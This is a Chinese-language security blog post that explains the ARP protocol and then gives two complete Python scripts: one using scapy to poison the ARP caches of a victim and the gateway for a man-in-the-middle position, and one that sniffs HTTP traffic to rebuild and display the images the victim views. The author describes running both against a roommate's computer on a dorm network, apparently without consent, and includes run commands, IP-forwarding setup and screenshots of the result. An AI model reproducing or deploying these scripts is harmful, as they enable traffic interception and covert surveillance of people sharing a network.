<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">





  <meta name="keywords" content="python," />










<meta name="description" content="arp协议分析&amp;amp;python编程实现arp欺骗抓图片这篇文章分析了arp协议并且用python的scapy库实现了一次arp攻击去劫持室友的上网流量">
<meta name="keywords" content="python">
<meta property="og:type" content="article">
<meta property="og:title" content="arp协议分析&amp;python编程实现arp欺骗抓图片">
<meta property="og:url" content="http://yoursite.com/2018/01/12/arpattack/index.html">
<meta property="og:site_name" content="Lawliet Blog">
<meta property="og:description" content="arp协议分析&amp;amp;python编程实现arp欺骗抓图片这篇文章分析了arp协议并且用python的scapy库实现了一次arp攻击去劫持室友的上网流量">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180113/D69hl1lIGD.PNG">
<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180113/1GLmkkH2Ai.PNG">
<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180113/k2IclB0dDa.PNG">
<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180113/h94m4kFC49.png?imageslim">
<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180113/6b1bI0Heb0.png?imageslim">
<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180113/EIckd61cHh.png?imageslim">
<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180114/JgBhi3KHgJ.PNG">
<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180114/KLm017GgK4.PNG">
<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180114/fg0BD08D09.PNG">
<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180116/I4CghAgijh.jpg?imageslim">
<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180114/BDFcg2j7ED.png?imageslim">
<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180116/lE1kD92EB0.jpg?imageslim">
<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180116/kI9l6IkGka.jpg?imageslim">
<meta property="og:updated_time" content="2018-06-04T17:21:18.768Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="arp协议分析&amp;python编程实现arp欺骗抓图片">
<meta name="twitter:description" content="arp协议分析&amp;amp;python编程实现arp欺骗抓图片这篇文章分析了arp协议并且用python的scapy库实现了一次arp攻击去劫持室友的上网流量">
<meta name="twitter:image" content="http://p008biu9n.bkt.clouddn.com/blog/180113/D69hl1lIGD.PNG">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.3',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2018/01/12/arpattack/"/>





  <title>arp协议分析&python编程实现arp欺骗抓图片 | Lawliet Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Lawliet Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">原创文章，未经授权请勿转载</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/12/arpattack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Lawliet">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/Ironman.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Lawliet Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">arp协议分析&python编程实现arp欺骗抓图片</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-12T22:24:48+08:00">
                2018-01-12
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python编程/" itemprop="url" rel="index">
                    <span itemprop="name">python编程</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="arp协议分析-amp-python编程实现arp欺骗抓图片"><a href="#arp协议分析-amp-python编程实现arp欺骗抓图片" class="headerlink" title="arp协议分析&amp;python编程实现arp欺骗抓图片"></a>arp协议分析&amp;python编程实现arp欺骗抓图片</h1><p><strong>这篇文章分析了arp协议并且用python的scapy库实现了一次arp攻击去劫持室友的上网流量</strong><br><a id="more"></a></p>
<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p><strong>1.kali2.0操作系统，本人用的32位的，装在vm12虚拟机中</strong></p>
<p><strong>2.python2.7.13，kali2.0自带</strong></p>
<p><strong>3.一个局域网和室友的电脑</strong></p>
<p><strong>4.kali所支持的无线网卡，型号为RT3070，某宝四十多就能能买到，主要用来抓取无线数据包，因为windows自带无线网卡kali不支持</strong></p>
<p><strong>选择kali支持的无线网卡可参考链接</strong><br><code>http://www.freebuf.com/articles/wireless/140065.html</code></p>
<p><strong>不过要注意一点，wn722n型号的无线网卡只有v1才支持kali，现在网上大多数卖的都是v2的，如果选择这一款买的时候要好好看一下，不要选错</strong><br><!--more--></p>
<h3 id="arp协议研究"><a href="#arp协议研究" class="headerlink" title="arp协议研究"></a>arp协议研究</h3><p><strong>在进行arp攻击之前，先来研究一下arp协议</strong></p>
<p><strong>arp协议简介：arp协议的全称为地址解析协议，是一种工作在网络层的协议，是一种将ip地址转换为MAC地址（物理地址）的协议</strong></p>
<p><strong>这里之所以需要使用MAC地址，是因为网络中用于连接各个设备的交换机使用了内容可寻址存储器（CAM，Coment Addressable Memory）。该存储器维护的ARP表列出了它在每一个端口的所有连接设备的MAC地址。当交换机收到了一个指向特定MAC地址的网络流量，它就会使用这个表，来确定应该使用哪一个端口发送流量。如果目标MAC地址是未知的，那么这个传输设备会首先在它的缓存中查找这个地址，如果没有找到，那么这个地址就需要通过在网络上额外的通信中解析了。因为在OSI七层模型中，ip地址在第三层网络层，传送的是数据报，mac地址在第二层数据链路层，传送的是数据帧，二层的以太网交换设备并不能识别32位的IP地址，它们是以48位以太网地址（就是我们常说的MAC地址）传输以太网数据包（帧）的，局域网的机器要和其他机器进行通信，首先要获取对方的物理地址，所以arp协议便把ip地址转换为物理地址来实现这种对应关系</strong></p>
<p><strong>arp协议数据包</strong></p>
<p><strong>arp数据包分为arp请求包和arp响应包，数据包格式如下图，arp数据包长度为28字节</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180113/D69hl1lIGD.PNG" alt="mark"><br><strong>其中op段代表操作类型，当op为1代表发起arp请求，说明这是一个arp请求包，当op为2时代表发起arp响应，说明这是一个arp响应包，现在假设局域网的一台机器要上外网（比如百度），首先要与网关进行通讯，获取网关的物理地址后才能传送数据通过网关访问外网，这台机器会首先查看自己电脑的arp缓存表（缓存时间为120s）中是否有网关的物理地址，如果没有便会向局域网内的机器以广播的形式发送arp请求包询问网管的物理地址，请求包主要字段如下</strong></p>
<pre><code>op:1(op值为1说明这是一次arp请求)
hwsrc：发送方MAC地址（即本机器MAC地址）
psrc：发送方ip地址（即本机内网ip地址）
hwdst：目标MAC地址（在这里为未知00：00：00：00：00：00）
pdst：目标ip地址（即网关ip地址，一般为192.168.0.1/192.168.1.1）
</code></pre><p><strong>局域网内所有机器接收此arp请求，如果发现请求的ip为自己的ip便会向请求机器发送arp响应，将自己的MAC地址带入arp响应包单播发送给请求的机器，arp响应包主要字段如下</strong></p>
<pre><code>op:2(op值为2说明这是一次arp响应)
hwsrc：发送方MAC地址（即网关MAC地址）
psrc：发送方ip地址（即网关ip地址）
hwdst：目标MAC地址（为发起arp请求的机器的MAC地址）
pdst：目标ip地址（为发起arp请求的机器的ip地址）
</code></pre><p><strong>这样发起arp请求的机器从arp响应包里获取MAC地址并添加到本机arp缓存中，与网关进行通信，在这里要注意一点，在本机向网关发送arp请求的同时，网关也会向本机发送arp请求获取本机MAC地址，同时本机也会向网关发送arp响应，这时一个双向的过程，这里不再重复</strong></p>
<p><strong>接下来为了更清楚的理解，用wireshark抓包来观察一下arp请求包和响应包</strong></p>
<p><strong>选择抓包的网卡接口，在这选择wlan0，并向网关发起ping请求与网关通信，本机ip为192.168.0.106，网关ip为192.168.0.1</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180113/1GLmkkH2Ai.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180113/k2IclB0dDa.PNG" alt="mark"><br><strong>在过滤窗口输入arp&amp;&amp;ip.addr==192.168.0.1将arp数据包过滤出来</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180113/h94m4kFC49.png?imageslim" alt="mark"><br><strong>观察arp请求包和响应包是否和上述描述的一致，图中做出了详细标明</strong></p>
<p><strong>arp请求包</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180113/6b1bI0Heb0.png?imageslim" alt="mark"><br><strong>arp响应包</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180113/EIckd61cHh.png?imageslim" alt="mark"></p>
<h3 id="arp欺骗"><a href="#arp欺骗" class="headerlink" title="arp欺骗"></a>arp欺骗</h3><p><strong>上面描述完了arp协议，下面来说一下arp欺骗攻击，假设局域网内有三台机器</strong></p>
<pre><code>网关:192.168.0.1
受害者机器：192.168.0.108
本机kali：192.168.0.106
</code></pre><p><strong>正常情况下，如果受害者和网关要进行通信，首先要使用arp协议进行对方的MAC地址获取，但是如果攻击者不断的向受害者发送arp响应包，告诉受害者网关的MAC地址为自己的MAC地址，包的大致内容如下</strong></p>
<pre><code>op:2(op值为2说明这是一次arp响应)
hwsrc：发送方MAC地址（攻击者MAC地址）
psrc：发送方ip地址（网关ip地址）
hwdst：目标MAC地址（受害者MAC地址）
pdst：目标ip地址（受害者ip地址）
</code></pre><p><strong>在这里发送方ip是网关的ip，但是发送方MAC已经变为了攻击者（kali）的MAC地址，受害者不断的接收这个arp响应包，便会在自己的arp缓存中不断的更新错误的ip与MAC的对应关系，及网关的MAC为攻击者的MAC，由此攻击者的网卡便可以捕获到受害者到网关之间的流量，到现在实现了arp断网，受害者因为与错误的MAC地址进行通讯而上不了网，如果攻击者的机器开启了ip转发，便可以将从受害者截取到的流量转发出去给网关，实现arp欺骗，也称为中间人攻击</strong></p>
<p><strong>arp欺骗一般是双向欺骗，我们通过arp欺骗可以捕获到受害者到网关的流量，同样的我们可以向网关发送arp响应包欺骗网关受害者的MAC地址为自己的MAC地址，截获网关到受害者之间的流量，arp响应包大致如下</strong></p>
<pre><code>op:2(op值为2说明这是一次arp响应)
hwsrc：发送方MAC地址（攻击者MAC地址）
psrc：发送方ip地址（受害者ip地址）
hwdst：目标MAC地址（网关MAC地址）
pdst：目标ip地址（网关ip地址）
</code></pre><p><strong>同样的网关在不断接受到此arp响应时也会不断的更新自己的arp缓存去建立错误的关系，我们的kali攻击机便可以双向的截获流量</strong></p>
<h3 id="用python实现arp攻击"><a href="#用python实现arp攻击" class="headerlink" title="用python实现arp攻击"></a>用python实现arp攻击</h3><p><strong>所需的python第三方库</strong></p>
<p><strong>scapy库：scapy是一个可用于网络嗅探的非常强大的第三方库。可以伪造，嗅探或发送网络数据包，这这里我们使用scapy库伪造arp响应包并发送,首先安装scapy库，kali默认自带</strong></p>
<pre><code>pip install scapy
</code></pre><p><strong>模拟攻击环境,一个真实的局域网，就是我们寝室</strong></p>
<pre><code>自己的kali攻击机:192.168.0.106,装在vm虚拟机中，连接了RT3070型号的无线网卡
室友的电脑:192.168.0.108，连接同一路由器的无线网
网关：192.168.0.1
</code></pre><p><strong>编写python代码：arpattack.py</strong></p>
<pre><code>from scapy.all import *#导入scapy模块
from optparse import OptionParser#导入命令行参数处理模块optparse
import sys
def main():
    usage=&quot;Usage: [-i interface] [-t targetip] [-g gatewayip]&quot;
    parser=OptionParser(usage)
    parser.add_option(&apos;-i&apos;,dest=&apos;interface&apos;,help=&apos;select interface(input eth0 or wlan0 or more)&apos;)#-i 所选择的网卡，eth0或wlan0，存放在interface变量中
    parser.add_option(&apos;-t&apos;,dest=&apos;targetip&apos;,help=&apos;select ip to spoof&apos;)#-t 要攻击的ip，存放在targetip变量中
    parser.add_option(&apos;-g&apos;,dest=&apos;gatewayip&apos;,help=&apos;input gateway ip&apos;)#-g 网关ip，存放在gatewayip变量中
    (options,args)=parser.parse_args()
    if options.interface and options.targetip and options.gatewayip:
        interface=options.interface
        tip=options.targetip
        gip=options.gatewayip
        spoof(interface,tip,gip)#将参数传给spoof函数
    else:
        parser.print_help()#显示帮助
        sys.exit(0)
def spoof(interface,tip,gip):#获取命令行的输入实现arp攻击
    localmac=get_if_hwaddr(interface)#get_if_hwaddr获取本地网卡MAC地址
    tmac=getmacbyip(tip)#根据目标ip获取其MAC地址
    gmac=getmacbyip(gip)#根据网关ip获取其MAC地址
    ptarget=Ether(src=localmac,dst=tmac)/ARP(hwsrc=localmac,psrc=gip,hwdst=tmac,pdst=tip,op=2)#构造arp响应包，欺骗目标机器网关的MAC地址为本机MAC地址
    pgateway=Ether(src=localmac,dst=gmac)/ARP(hwsrc=localmac,psrc=tip,hwdst=gmac,pdst=gip,op=2)#构造arp响应包，欺骗网关目标机器的MAC地址为本机MAC地址
    try:
        while 1:
            sendp(ptarget,inter=2,iface=interface)
            print &quot;send arp reponse to target(%s),gateway(%s) macaddress is %s&quot;%(tip,gip,localmac)
            sendp(pgateway,inter=2,iface=interface)
            print &quot;send arp reponse to gateway(%s),target(%s) macaddress is %s&quot;%(gip,tip,localmac)#不断发送arp响应包欺骗目标机器和网关，直到ctrl+c结束程序
    except KeyboardInterrupt:
        sys.exit(0)
if __name__==&apos;__main__&apos;:
    main()
</code></pre><p><strong>脚本使用到的scapy库中的几个函数</strong></p>
<pre><code>get_if_hwaddr(&quot;本地网卡名称（eth0/wlan0）&quot;)    根据所选择的本地网卡获取相应的本地网卡的MAC地址
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180114/JgBhi3KHgJ.PNG" alt="mark"></p>
<pre><code>getmacbyip（&quot;ip地址&quot;）    根据ip地址获取其MAC地址，使用该函数实际上使用了一次arp协议，可以用此函数获取网关和目标的MAC地址
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180114/KLm017GgK4.PNG" alt="mark"><br>    ARP是构建ARP数据包的类，Ether用来构建以太网数据包，构造arp数据包并加上以太网头部</p>
<pre><code>Ether(src=本地网卡MAC,dst=目标机器MAC)/ARP(hwsrc=本地网卡MAC,psrc=网关ip,hwdst=目标机器MAC,pdst=目标机器ip,op=2)
构造发送给目标机器的arp数据包，并加上以太网头部，欺骗目标机器网关的MAC为本机的MAC

Ether(src=本地网卡MAC,dst=网关MAC)/ARP(hwsrc=本地网卡MAC,psrc=网关ip,hwdst=网关MAC,pdst=网关ip,op=2)
构造发送给网关的arp数据包，并加上以太网头部，欺骗网关目标机器的MAC为本机的MAC

sendp函数发送我们构造的arp数据包    sendp(数据包, inter=2, iface=网卡)    sendp函数工作在网络的第二层
</code></pre><p><strong>以上代码实现了类似于arpspoof工具的功能，使用方法，进入脚本目录，输入</strong></p>
<pre><code>python arpattack.py -h
</code></pre><p><strong>查看脚本使用帮助</strong></p>
<pre><code>Usage: [-i interface] [-t targetip] [-g gatewayip]

Options:
    -h, --help    show this help message and exit
    -i INTERFACE  select interface(input eth0 or wlan0 or more)
    -t TARGETIP   select ip to spoof
    -g GATEWAYIP  input gateway ip
</code></pre><p><strong>所以我们这样输入可以双向的欺骗网关和目标机器完中间人攻击</strong></p>
<pre><code>python arpattack.py -i 网卡 -t 要攻击的目标的ip地址 -g 网关ip
</code></pre><p><strong>输入</strong></p>
<pre><code>python arpattack.py -i wlan0 -t 192.168.0.8 -g 192.168.0.1
</code></pre><p><strong>选择无线网卡wlan0的MAC地址去欺骗室友的电脑和网关路由器，如果我和室友都插了网线，就要选择eth0</strong></p>
<p><strong>运行脚本便会不断的向室友的电脑和网关发送arp响应包进行双向欺骗，效果如下</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180114/fg0BD08D09.PNG" alt="mark"><br><strong>室友电脑arp缓存</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180116/I4CghAgijh.jpg?imageslim" alt="mark"><br><strong>路由器arp缓存</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180114/BDFcg2j7ED.png?imageslim" alt="mark"><br><strong>这时我们截获了室友电脑和网关之间的流量，使其不能相互通信，完成了arp断网</strong></p>
<pre><code>echo &quot;1&quot;&gt;/proc/sys/net/ipv4/ip_forward
</code></pre><p><strong>开启流量转发，这时室友和网关正常通讯，但是流量会经过我们的网卡</strong></p>
<p><strong>接下来用python编写代码查看室友电脑浏览的网页图片，其实不难，因为浏览图片一般都是向服务器发送一次请求图片的http请求，所以只需从经过我们网卡的流量中过滤tcp80端口的数据包（http协议），将数据包的头部层层去掉，最后便能得到应用层的http数据包，在利用正则表达式将<code>http://*.jpg</code>筛选出来即可知道室友请求了哪些图片，python的pcap库和dpkt库可以使我们很容易的得到电脑网卡流量中的http应用层数据包</strong></p>
<pre><code>apt-get install libpcap-dev

pip install pypcap

pip install dpkt
</code></pre><p><strong>安装pcap库和dpkt库</strong></p>
<p><strong>pcap模块的pcap方法可以返回一个用来捕获网卡数据包的pcap对象</strong></p>
<p><strong>dpkt，一个数据包解析工具，可以解析离线/实时pcap数据包</strong></p>
<p><strong>python代码如下stealimg.py</strong></p>
<pre><code>import pcap
import dpkt
import re
import requests
from PIL import Image
from io import BytesIO
from optparse import OptionParser
import sys
urllist=[]
def main():
    usage=&quot;Usage: [-i interface]&quot;
    parser=OptionParser(usage)
    parser.add_option(&apos;-i&apos;,dest=&apos;interface&apos;,help=&apos;select interface(input eth0 or wlan0 or more)&apos;)
    (options,args)=parser.parse_args()
    if options.interface:
        interface=options.interface
        pc=pcap.pcap(interface)
        pc.setfilter(&apos;tcp port 80&apos;)
        for ptime,pdata in pc:
            getimg(pdata)
    else:
        parser.print_help()
        sys.exit(0)
def getimg(pdata):
    global urllist
    p=dpkt.ethernet.Ethernet(pdata)
    if p.data.__class__.__name__==&apos;IP&apos;:
        if p.data.data.__class__.__name__==&apos;TCP&apos;:
            if p.data.data.dport==80:
                pa=re.compile(r&apos;GET (.*?\.jpg)&apos;)#|.*?\.png|.*?\.gif
                img=re.findall(pa,p.data.data.data)
                if img!=[]:
                    lines=p.data.data.data.split(&apos;\n&apos;)
                    for line in lines:
                        if &apos;Host:&apos; in line:
                            url=&apos;http://&apos;+line.split(&apos;:&apos;)[-1].strip()+img[-1]
                            if url not in urllist:
                                urllist.append(url)
                                if &apos;Referer:&apos; in p.data.data.data:
                                    for line in lines:
                                        if &apos;Referer:&apos; in line:
                                            referer=line.split(&apos;:&apos;)[-1].strip()
                                            print url
                                            r=requests.get(url,headers={&apos;Referer&apos;:referer})
                                            img=Image.open(BytesIO(r.content))
                                            img.show()
                                else:
                                    r=requests.get(url)
                                    img=Image.open(BytesIO(r.content))
                                    img.show()
                            else:
                                pass
if __name__==&apos;__main__&apos;:
    main()  
</code></pre><p><strong>代码将pcap从本机网卡捕获到的完整的网络数据包使用dpkt库将其中封装的http应用层数据包提取出来，通过正则表达式将请求图片的http请求过滤出来，并在本机请求并输出，完成窥屏，效果如下</strong></p>
<p><strong>室友电脑浏览图片</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180116/lE1kD92EB0.jpg?imageslim" alt="mark"><br><strong>自己kali可以窥屏</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180116/kI9l6IkGka.jpg?imageslim" alt="mark"></p>
<p><strong>注意一点，百度的图片爬取要在http请求头中加上Referer字段，否则会出现403禁止访问，代码只是简单的实现了窥屏的效果，还有着很多不足，不过通过这次学习可以对arp欺骗攻击有更深的理解</strong></p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/python/" rel="tag"># python</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2018/01/12/KPPW25xss/" rel="next" title="KPPW2.5XSS引起的CSRF">
                <i class="fa fa-chevron-left"></i> KPPW2.5XSS引起的CSRF
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2018/02/27/centos7mysql/" rel="prev" title="centos7安装mysql">
                centos7安装mysql <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/Ironman.jpg"
                alt="Lawliet" />
            
              <p class="site-author-name" itemprop="name">Lawliet</p>
              <p class="site-description motion-element" itemprop="description">信息安全技术博客</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">38</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">14</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">20</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          <div class="links-of-author motion-element">
            
          </div>

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.shentoushi.top/index" title="渗透测试师导航" target="_blank">渗透测试师导航</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.lorexxar.cn/" title="LoRexxar's Blog" target="_blank">LoRexxar's Blog</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.leavesongs.com/" title="P牛" target="_blank">P牛</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.4o4notfound.org/" title="404 Not Found'Blog" target="_blank">404 Not Found'Blog</a>
                  </li>
                
              </ul>
            </div>
          
          

        </div>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=524543708&auto=0&height=66"></iframe>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#arp协议分析-amp-python编程实现arp欺骗抓图片"><span class="nav-number">1.</span> <span class="nav-text">arp协议分析&python编程实现arp欺骗抓图片</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#实验环境"><span class="nav-number">1.0.1.</span> <span class="nav-text">实验环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#arp协议研究"><span class="nav-number">1.0.2.</span> <span class="nav-text">arp协议研究</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#arp欺骗"><span class="nav-number">1.0.3.</span> <span class="nav-text">arp欺骗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#用python实现arp攻击"><span class="nav-number">1.0.4.</span> <span class="nav-text">用python实现arp攻击</span></a></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Lawliet</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.3</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>



